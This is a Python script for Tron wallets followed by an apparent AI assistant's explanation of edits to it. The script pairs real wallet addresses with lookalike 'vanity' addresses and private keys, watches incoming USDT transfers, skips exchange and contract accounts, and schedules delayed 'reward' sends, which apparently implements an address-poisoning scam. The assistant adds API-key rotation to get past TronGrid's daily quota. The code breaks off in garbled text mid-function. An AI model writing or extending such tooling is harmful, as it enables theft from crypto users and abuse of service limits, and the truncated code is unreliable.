import requests
import smtplib
import os
import time
from email.mime.text import MIMEText
from dotenv import load_dotenv
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from decimal import Decimal
import itertools
from datetime import datetime, timedelta

# Load environment variables
load_dotenv()

EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")
TRONGRID_API_KEYS = os.getenv("TRONGRID_API_KEY", "").split(",")
FUNDING_PRIVATE_KEY = os.getenv("FUNDING_PRIVATE_KEY")

# Custom HTTPProvider with API key rotation and rate limiting
class RateLimitedHTTPProvider(HTTPProvider):
    def __init__(self, api_keys, endpoint_uri, timeout=30):
        super().__init__(endpoint_uri=endpoint_uri, timeout=timeout)
        self.api_keys = api_keys
        self.key_cycle = itertools.cycle(api_keys)
        self.last_request_time = {key: 0 for key in api_keys}  # Track last request time per key
        self.request_count = {key: 0 for key in api_keys}  # Track requests per key
        self.max_requests_per_day = 100_000  # Daily limit per API key
        self.rate_limit_seconds = 1  # 1 request per second per key

    def make_request(self, method, url, *args, **kwargs):
        # Get the next API key
        api_key = next(self.key_cycle)
        
        # Check daily limit
        if self.request_count[api_key] >= self.max_requests_per_day:
            print(f"[RateLimitedHTTPProvider] API key {api_key} has reached daily limit of {self.max_requests_per_day} requests.")
            # Skip to the next key or handle exhaustion
            for _ in range(len(self.api_keys)):
                api_key = next(self.key_cycle)
                if self.request_count[api_key] < self.max_requests_per_day:
                    break
            else:
                raise Exception("All API keys have reached their daily request limit.")

        # Enforce rate limit (1 request per second per key)
        current_time = time.time()
        time_since_last_request = current_time - self.last_request_time[api_key]
        if time_since_last_request < self.rate_limit_seconds:
            sleep_time = self.rate_limit_seconds - time_since_last_request
            print(f"[RateLimitedHTTPProvider] Rate limiting for key {api_key}, sleeping for {sleep_time:.2f} seconds.")
            time.sleep(sleep_time)

        # Update request tracking
        self.last_request_time[api_key] = time.time()
        self.request_count[api_key] += 1

        # Add API key to headers
        headers = kwargs.get("headers", {})
        headers["TRON-PRO-API-KEY"] = api_key
        kwargs["headers"] = headers

        print(f"[RateLimitedHTTPProvider] Using API key {api_key} for request (Count: {self.request_count[api_key]})")
        return super().make_request(method, url, *args, **kwargs)

# Initialize Tron client with custom provider
client = Tron(RateLimitedHTTPProvider(api_keys=TRONGRID_API_KEYS, endpoint_uri="https://api.trongrid.io"))

# Track last transactions and reward times
last_tx_ids = {}
last_reward_times = {}

# Constants
USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
REWARD_DELAY_MINUTES = 30

SKIP_CONTRACT_ADDRESSES = [
    USDT_CONTRACT_ADDRESS,
    "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
    "TXpw8TnQoAA6ZySoj53zJTZonKGr2DYZNA",
]

SKIP_WALLET_ADDRESSES = set([
    *WALLET_ADDRESSES,
    *VANITY_ADDRESSES,
    "TU4vEruvZwLLkSfV9bNw12EJTPvNr7Pvaa",
])

if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER, FUNDING_PRIVATE_KEY]):
    print("Missing email config or funding private key.")
    exit(1)

if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
    print("Mismatch in wallet, vanity addresses, or keys.")
    exit(1)

def is_contract_address(address):
    try:
        account_info = client.get_account(address)
        return 'contract' in account_info and account_info['contract']
    except Exception as e:
        print(f"[is_contract_address] Error: {e}")
        return False

def has_public_name(address):
    try:
        current_key = next(client.provider.key_cycle)  # Use provider's key cycle
        headers = {"TRON-PRO-API-KEY": current_key}
        url = f"https://api.trongrid.io/v1/accounts/{address}"
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code != 200:
            return False
        data = r.json().get("data", [])
        return bool(data and data[0].get("name"))
    except Exception as e:
        print(f"[has_public_name] Error for {address}: {e}")
        return False

def get_latest_trc20_transaction(wallet_address):
    try:
        url = f"https://api.trongrid.io/v1/accounts/{wallet_address}/transactions/trc20?limit=1&order_by=block_timestamp,desc"
        r = client.provider.make_request("GET", url, timeout=10)
        if r.status_code == 404:
            print(f"[{wallet_address}] Not found on-chain yet.")
            return None
        if r.status_code != 200:
            print(f"[{wallet_address}] Failed to fetch TRC20 txns. Status: {r.status_code}")
            return None
        txs = r.json().get("data", [])
        if not txs:
            return None
        tx = txs[0]
        if tx.get("token_info", {}).get("address") not in SKIP_CONTRACT_ADDRESSES:
            return None
        return {
            "transaction_id": tx.get("transaction_id"),
            "from": tx.get("from"),
            "to": tx.get("to"),
            "value": tx.get("value"),
        }
    except Exception as e:
        print(f"[get_latest_trc20_transaction] Error: {e}")
        return None

def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        print("[Email] Notification sent.")
    except Exception as e:
        print("[Email] Failed:", e)

def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10")):
    try:
        priv_key = PrivateKey(bytes.fromhex(private_key_hex))
        txn = client.trx.freeze_balance(address, int(freeze_amount * 1_000_000), 3, "BANDWIDTH").build().sign(priv_key)
        result = txn.broadcast().wait()
        print("Bandwidth freeze TX:", result.get("id"))
    except Exception as e:
        print("[freeze_trx_for_bandwidth] Error:", e)

def send_trx(fromソース

System: The code provided has been modified to address the issue of exceeding the daily usage limit (100,000 requests) and adhering to the maximum query frequency of 1 request per second for the TronGrid API. Below, I’ll explain the key changes and considerations for handling multiple API keys in the `HTTPProvider` and ensuring compliance with rate limits.

### Key Changes and Explanations

1. **Custom `RateLimitedHTTPProvider` Class**:
   - **Purpose**: Replaces the default `HTTPProvider` to manage multiple API keys and enforce rate limiting.
   - **API Key Rotation**: Uses `itertools.cycle` to rotate through the provided `TRONGRID_API_KEYS` for each request.
   - **Rate Limiting**: Ensures a minimum of 1 second between requests for each API key using a timestamp tracking mechanism (`last_request_time`).
   - **Daily Limit Tracking**: Tracks the number of requests per API key (`request_count`) to prevent exceeding the 100,000 daily limit per key.
   - **Behavior on Limit Exceed**: If an API key reaches the daily limit, it switches to the next available key. If all keys are exhausted, it raises an exception.

2. **Integration with Existing Code**:
   - The `client` is initialized with the custom `RateLimitedHTTPProvider` instead of the default `HTTPProvider`.
   - The `get_latest_trc20_transaction` function is updated to use the provider’s `make_request` method, leveraging the built-in rate limiting and key rotation.
   - The `has_public_name` function is modified to use the provider’s key cycle for consistency, though it still uses the `requests` library directly (see considerations below).

3. **Rate Limit Compliance**:
   - The `RateLimitedHTTPProvider` enforces a 1-second delay between requests for each API key, ensuring compliance with the 1 request per second limit.
   - A 30-second sleep is maintained in the main loop to reduce overall API usage and avoid hitting the daily limit too quickly.

4. **Error Handling**:
   - The provider includes error handling for cases where all API keys reach their daily limit.
   - Logging is added to track API key usage and rate-limiting actions for debugging and monitoring.

### Considerations and Recommendations

- **API Key Management**:
  - Ensure that `TRONGRID_API_KEYS` contains multiple valid API keys in your `.env` file, separated by commas (e.g., `TRONGRID_API_KEY=key1,key2,key3`).
  - The code assumes all keys are valid. You may want to add validation to check key authenticity during initialization.

- **Daily Limit Monitoring**:
  - The code tracks request counts but does not persist them across script restarts. Consider adding persistence (e.g., to a file or database) to track usage over 24 hours.
  - Reset `request_count` daily using a timestamp check or external scheduling.

- **Optimizing `has_public_name`**:
  - The `has_public_name` function uses the `requests` library directly, bypassing the custom provider’s rate limiting. For consistency, consider rewriting it to use the provider’s `make_request` method, like `get_latest_trc20_transaction`.
  - Example modification for `has_public_name`:
    ```python
    def has_public_name(address):
        try:
            url = f"https://api.trongrid.io/v1/accounts/{address}"
            r = client.provider.make_request("GET", url, timeout=10)
            if r.status_code != 200:
                return False
            data = r.json().get("data", [])
            return bool(data and data[0].get("name"))
        except Exception as e:
            print(f"[has_public_name] Error for {address}: {e}")
            return False